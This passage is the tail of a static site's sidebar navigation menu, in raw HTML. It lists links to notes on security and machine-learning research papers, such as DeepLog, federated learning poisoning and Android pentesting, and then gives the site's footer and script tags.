href=/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/index.html>DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes</a></li><li data-nav-id=/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/index.html><a class=padding href=/survey-papers/ml-dl-+-security/deeplog_-anomaly-detection-and-diagnosis-from-system-logs-through-deep-learning/index.html>DeepLog: Anomaly Detection and Diagnosis from System Logs through Deep Learning</a></li><li data-nav-id=/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/index.html><a class=padding href=/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/index.html>EIFFeL: Ensuring Integrity For Federated Learning - Notes</a></li><li data-nav-id=/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/index.html><a class=padding href=/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/index.html>Exploiting ML ALG for Efficient Detection and Prevention of JS-XSS Attacks in Android Based Hybrid Applications</a></li><li data-nav-id=/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/index.html><a class=padding href=/survey-papers/android-+-security/gui-testing/fastbot_-a-multi-agent-model-based-test-generation-system/index.html>Fastbot: A Multi-Agent Model-Based Test Generation System</a></li><li data-nav-id=/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/index.html><a class=padding href=/survey-papers/android-+-security/gui-testing/fastbot2_-reusable-automated-model-based-gui-testing-for-android-enhanced-by-reinforcement-learning/index.html>Fastbot2: Reusable Automated Model-based GUI Testing for Android Enhanced by Reinforcement Learning</a></li><li data-nav-id=/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/index.html><a class=padding href=/survey-papers/federated-learning/fedml-he---an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system---notes/index.html>FedML-HE - An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System - Notes</a></li><li data-nav-id=/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/index.html><a class=padding href=/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/index.html>How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes</a></li><li data-nav-id=/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/index.html><a class=padding href=/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/index.html>Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis</a></li><li data-nav-id=/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/index.html><a class=padding href=/survey-papers/federated-learning/local-model-poisoning-attacks-to-byzantine-robust-federated-learning---notes/index.html>Local Model Poisoning Attacks to Byzantine-Robust Federated Learning - Notes</a></li><li data-nav-id=/survey-papers/android-+-security/tool/pentest-tools-survey/index.html><a class=padding href=/survey-papers/android-+-security/tool/pentest-tools-survey/index.html>Pentest Tools Survey</a></li><li data-nav-id=/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/index.html><a class=padding href=/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/index.html>The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes</a></li><li data-nav-id=/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/index.html><a class=padding href=/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/index.html>Uncovering Intent based Leak of Sensitive Data in Android Framework</a></li><li data-nav-id=/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/index.html><a class=padding href=/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/index.html>Understanding Real-world Threats to Deep Learning Models in Android Apps</a></li><li data-nav-id=/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/index.html><a class=padding href=/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/index.html>VAPTAi: A Threat Model for Vulnerability Assessment and Pentesting of Android and iOS Mobile Banking Apps</a></li><li data-nav-id=/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/index.html><a class=padding href=/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/index.html>WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens</a></li><li data-nav-id=/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/index.html><a class=padding href=/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/index.html>有關Pentest但貢獻很爛的三篇論文</a></li></ul></li><li data-nav-id=/terminology/index.html><a class=padding href=/terminology/index.html>Terminologies</a><ul id=R-subsections-a19bf87a9a9aaf0a4146b803a35492f8 class=collapsible-menu></ul></li><li data-nav-id=/toc/index.html><a class=padding href=/toc/index.html>TOCs</a><ul id=R-subsections-451d3779340ac1afa8683c0232808cbf class=collapsible-menu></ul></li><li data-nav-id=/tools/index.html><a class=padding href=/tools/index.html>Tools</a><ul id=R-subsections-bf1399820dde3dd110e03ace4147ff86 class=collapsible-menu></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=/js/clipboard/clipboard.min.js?1743619851 defer></script><script src=/js/perfect-scrollbar/perfect-scrollbar.min.js?1743619851 defer></script><script src=/js/theme.min.js?1743619851 defer></script></body></html>